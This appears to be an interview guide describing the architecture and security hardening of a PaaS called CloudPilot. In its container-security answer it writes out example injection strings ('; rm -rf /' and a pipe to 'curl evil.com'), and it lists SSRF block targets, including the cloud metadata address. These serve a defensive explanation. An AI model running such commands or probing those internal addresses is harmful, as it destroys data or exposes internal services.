# CloudPilot Senior Full-stack & DevOps Interview Guide

> Top 10 In-Depth Technical Interview Questions and Authoritative Answers based directly on the CloudPilot Codebase & Production Architecture.

---

## 1. TypeScript & Monorepo Architecture

### Question:

_How do you structure type safety and package boundaries in a pnpm monorepo containing NestJS, React, and BullMQ worker? How do you prevent type duplication and circular dependencies?_

### Answer:

- **Shared Packages Topology**:
  CloudPilot utilizes a pnpm workspace monorepo with dedicated shared packages:
  - `@cloudpilot/shared`: Contains framework-agnostic domain models, enums (`DeploymentStatus`, `ProjectRole`), AES-256-GCM encryption utilities, and validation DTOs.
  - `@cloudpilot/database`: Contains the Prisma schema, generated client, and disaster recovery utilities.
  - `@cloudpilot/tsconfig`: Enforces centralized, strict TypeScript compiler configurations (`strict: true`, `noImplicitAny: true`, `strictNullChecks: true`).
- **Dependency Flow**:
  Applications (`apps/api`, `apps/worker`, `apps/web`) depend strictly downward on packages (`packages/*`). Packages **never** depend on applications or on each other circularly.
- **DTO Sharing & Type Inference**:
  Instead of redefining types on the frontend, `apps/web` imports types and validation schemas directly from `@cloudpilot/shared`. This guarantees that if a backend model field changes, the frontend TypeScript compiler immediately flags type errors at build time.

---

## 2. NestJS Architecture & Modular Monolith

### Question:

_Why did you choose a Modular Monolith in NestJS over microservices for the core API? How do Dependency Injection, Guards, and Filters maintain strict separation of concerns?_

### Answer:

- **Architectural Rationale**:
  For an MVP and medium-scale PaaS, microservices introduce substantial operational tax: network serialization overhead, distributed tracing complexity, multiple CI/CD pipelines, and eventual consistency dilemmas. A **Modular Monolith** provides high developer velocity and ACID database transactions within a single deployable container.
- **Enforcing Boundaries with NestJS**:
  - **Module Encapsulation**: Each domain (`AuthModule`, `ProjectsModule`, `DeploymentsModule`) explicitly declares its `imports`, `providers`, and `exports`. Internal services remain private to their module.
  - **ProjectMemberGuard (RBAC)**: Validates session cookies, extracts user identity, and verifies project membership against PostgreSQL before reaching controller route handlers.
  - **HttpExceptionFilter**: Intercepts all unhandled exceptions and formats consistent, sanitized JSON responses adhering to a unified schema (`{ success: false, error: { code, message, details }, meta: { timestamp, requestId } }`), preventing internal stack trace leaks to clients.

---

## 3. PostgreSQL, Prisma & ACID Transactions

### Question:

_How does CloudPilot handle transactional data integrity during multi-table operations (e.g. project creation or disaster recovery)? How do you prevent foreign key deadlock and cascade issues?_

### Answer:

- **Interactive Transactions**:
  Operations requiring multiple interdependent mutations use Prisma's `$transaction(async (tx) => { ... })`. For example, when creating a project:
  1. Insert `Project` record.
  2. Insert default `Environment` ("production").
  3. Insert `ProjectMember` record assigning the creator as `OWNER`.
  4. Record `AuditLog` entry.
     If any step fails, all mutations roll back atomically, preventing orphaned projects without owners or environments.
- **Disaster Recovery Topological Ordering**:
  During full database restore (`backup-restore.ts`), tables are populated in strict topological dependency order:
  `User` $\to$ `Project` $\to$ `ProjectMember` $\to$ `OAuthAccount` $\to$ `Environment` $\to$ `EnvironmentVariable` $\to$ `Deployment` $\to$ `DeploymentLog` $\to$ `Release` $\to$ `AuditLog`.
  This guarantees foreign key constraints are never violated during bulk insertion.

---

## 4. Queue Architecture & Concurrency with BullMQ

### Question:

_Why did you choose BullMQ and Redis for deployment jobs? How does BullMQ manage job lifecycles, and how do you prevent worker queue starvation or handle stalled jobs?_

### Answer:

- **Decoupling I/O-Heavy Operations**:
  Cloning Git repositories and building Docker images can take up to several minutes. BullMQ decouples these operations from the HTTP Event Loop:
  - `POST /api/v1/deployments` writes a `QUEUED` record and enqueues a job into Redis in under 15ms.
  - Background workers process jobs asynchronously without degrading API latency.
- **Queue Mechanics**:
  BullMQ uses Redis data structures (Streams, Sorted Sets for delayed/retry states, and Hashes for job data).
- **Stalled Job Protection**:
  Workers maintain a lock token with an active heartbeat. If a worker process crashes abruptly or is killed by the OS kernel, BullMQ's `stalledInterval` detects the lost lock after 30 seconds and automatically re-assigns the job to an available healthy worker.
- **Concurrency Control**:
  Worker instances configure `concurrency: 2` (or CPU count based), preventing CPU thrashing and disk saturation on the host machine.

---

## 5. Idempotency in Distributed Asynchronous Systems

### Question:

_What is idempotency, and where is it critical in CloudPilot? How do you prevent duplicate deployments from duplicate GitHub webhooks or worker restarts?_

### Answer:

- **Webhook Deduplication**:
  GitHub webhooks include an `X-GitHub-Delivery` UUID header. CloudPilot records this delivery ID in the `webhook_deliveries` table. When GitHub retries a delivery (e.g. due to temporary network lag), CloudPilot checks for existence:
  - If already processed: returns `200 OK` immediately without enqueuing a duplicate build job.
- **Worker Restart Idempotency**:
  If a worker container restarts while a BullMQ job is in flight:
  - The worker checks the deployment's current status in PostgreSQL before executing.
  - If the deployment has already been marked `CANCELLED` or is in a terminal state, the worker skips execution gracefully without spawning orphaned Docker build processes.

---

## 6. Docker Container Isolation & Runtime Security

### Question:

_When building a PaaS where users can deploy arbitrary web code, what are the primary security risks and how did you isolate user containers from the host and each other?_

### Answer:

- **Command Injection Immunity**:
  All Git and Docker operations use Node.js `child_process.spawn(cmd, args, { shell: false })`. Without a shell interpreter (`sh`, `bash`, `cmd`), attackers cannot inject chained commands (e.g. `; rm -rf /` or `| curl evil.com`).
- **Fork Bomb Neutralization**:
  Every deployed container is launched with `--pids-limit=100`, capping the maximum number of simultaneous processes and neutralizing fork bomb exploits.
- **Resource Constraints (cgroups)**:
  Containers are bounded by hard limits: `--memory=512m` and `--cpus=0.5` to prevent CPU monopolization and Out-Of-Memory host crashes.
- **Privilege Escalation Prevention**:
  `--security-opt=no-new-privileges:true` prevents binaries with `setuid`/`setgid` bits from escalating privileges inside the container.
- **Docker Socket Isolation**:
  The Docker daemon socket (`/var/run/docker.sock`) is mounted **only** into the trusted Worker container. Deployed user applications never receive Docker socket mounts.
- **Localhost Port Binding**:
  Host ports are mapped strictly to `127.0.0.1:${port}` rather than `0.0.0.0:${port}`, preventing unauthorized direct access from external networks.

---

## 7. Zero-Downtime Deployment & Instant Rollback

### Question:

_Explain the mechanics of zero-downtime deployment in CloudPilot. How do you guarantee the live service never drops requests, and how does the rollback mechanism work without rebuilding?_

### Answer:

- **Blue-Green Container Promotion**:
  1. The existing container (Blue) continues serving live traffic.
  2. The candidate container (Green) starts on an isolated local port.
  3. Worker actively polls `http://127.0.0.1:<port>/health` every 1 second (up to 30s timeout).
  4. Only upon receiving HTTP 200, the release status is updated to `ACTIVE`, reverse proxy route updates, and the old container is gracefully retired.
  5. If candidate healthcheck times out or returns error, the candidate container is terminated immediately; Blue remains active with zero downtime.
- **Instant Rollback**:
  Rolling back to a prior release re-uses the pre-built, verified image tag (`imageDigest`). Because the image is already locally cached and validated, the candidate container boots and passes healthcheck in under 3 seconds without re-cloning or re-building.

---

## 8. Security & Cryptography (AES-256-GCM, SSRF, BOLA)

### Question:

_How does CloudPilot protect sensitive environment variables, GitHub tokens, and prevent Broken Object Level Authorization (BOLA/IDOR)?_

### Answer:

- **AES-256-GCM Encryption**:
  Environment secrets and GitHub tokens are encrypted at rest using AES-256-GCM with a 12-byte initialization vector (`iv`) and 16-byte authentication tag (`authTag`). GCM mode provides Authenticated Encryption with Associated Data (AEAD), ensuring both data confidentiality and cryptographic tamper-proofing.
- **Secret Masking & Reveal Auditing**:
  Secret values are masked as `••••••••` in list responses. Revealing a secret requires `OWNER`/`MAINTAINER` role and triggers an immutable `AuditLog` entry (`SECRET_REVEALED`).
- **SSRF Protection**:
  Repository URLs submitted to project creation are validated against regex filters blocking localhost (`127.0.0.1`, `localhost`), loopback (`0.0.0.0`), RFC1918 private subnets (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), and Cloud Metadata endpoints (`169.254.169.254`).
- **Object-Level Access Control (BOLA/IDOR)**:
  Every mutation and read checks project membership directly in the database (`WHERE projectId = :id AND userId = :currentUserId`). Users cannot view or modify projects they do not belong to, even if they guess valid project IDs or slugs.

---

## 9. Observability & SRE (Correlation IDs & Health Probes)

### Question:

_How do you monitor system health and trace requests across the HTTP API, background BullMQ jobs, and deployed containers?_

### Answer:

- **Correlation ID Middleware**:
  Every incoming request is tagged with an `X-Request-Id` UUID via `CorrelationIdMiddleware`. This ID is attached to response headers, passed to structured HTTP access logs, and recorded in database audit events, enabling end-to-end request tracing.
- **Structured HTTP Logging**:
  `LoggingMiddleware` logs method, route path, status code, latency (ms), client IP, and correlation ID.
- **Multi-Tier Health Probes**:
  - `/api/v1/health`: Probes PostgreSQL connectivity (`$queryRaw SELECT 1`) and Redis ping, returning latency metrics for both services alongside process memory usage (RSS & Heap).
  - `/api/v1/health/detailed`: Returns BullMQ queue gauges (waiting, active, completed, failed jobs) and process uptime for autoscalers and monitoring dashboards.

---

## 10. CI/CD & Production Engineering

### Question:

_How is your CI/CD pipeline structured, and what guarantees does it provide before code reaches production?_

### Answer:

- **Multi-Stage Verification Pipeline (GitHub Actions)**:
  1. **Linting & Code Quality**: ESLint v10 and Prettier style check.
  2. **Strict Typechecking**: TypeScript compiler (`tsc --noEmit`) across all workspace packages.
  3. **Automated Test Execution**: Vitest running 76 unit, integration, and E2E tests against live PostgreSQL and Redis service containers.
  4. **Build Validation**: Full compilation of API, Worker, and Web distribution bundles.
- **Staging & Smoke Testing**:
  Deployments to Staging trigger `pnpm test:smoke`, validating live database connectivity, authentication, RBAC scoping, and web frontend static asset delivery.
- **Production Approval Gate**:
  Promoting staging releases to production requires explicit manual approval via GitHub Actions Environments (`environment: production`), enforcing change control and compliance.
